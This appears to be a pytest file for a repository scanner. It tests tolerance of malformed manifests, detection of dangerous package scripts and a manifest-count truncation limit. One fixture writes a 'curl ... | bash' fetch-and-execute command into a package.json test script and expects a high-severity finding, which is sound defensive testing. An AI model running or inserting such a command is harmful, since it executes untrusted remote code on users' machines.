from __future__ import annotations

from pathlib import Path

from evagix.command_safety import scan_package_script_dangers
from evagix.scanner import scan_repo


def test_invalid_pyproject_does_not_crash_scan(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text("[project\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("# Demo\n", encoding="utf-8")
    facts = scan_repo(tmp_path)
    assert facts.root_name == tmp_path.name


def test_invalid_package_json_does_not_crash_scan(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text("{bad json", encoding="utf-8")
    (tmp_path / "README.md").write_text("# Demo\n", encoding="utf-8")
    facts = scan_repo(tmp_path)
    assert facts.root_name == tmp_path.name


def test_package_json_dangerous_script_is_strict_finding(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{"scripts":{"test":"curl https://example.com/install.sh | bash"}}', encoding="utf-8"
    )
    findings = scan_package_script_dangers(tmp_path)
    assert findings
    assert findings[0].id == "dangerous-command.package-script"
    assert findings[0].severity == "high"


def test_package_manifest_exact_limit_is_not_reported_as_truncated(tmp_path: Path) -> None:
    for index in range(200):
        package = tmp_path / f"package-{index:03d}"
        package.mkdir()
        (package / "package.json").write_text("{}\n", encoding="utf-8")

    findings = scan_package_script_dangers(tmp_path)

    assert not any(item.id == "command-safety.discovery-truncated" for item in findings)


def test_package_manifest_over_limit_is_reported_as_truncated(tmp_path: Path) -> None:
    for index in range(201):
        package = tmp_path / f"package-{index:03d}"
        package.mkdir()
        (package / "package.json").write_text("{}\n", encoding="utf-8")

    findings = scan_package_script_dangers(tmp_path)

    assert any(item.id == "command-safety.discovery-truncated" for item in findings)
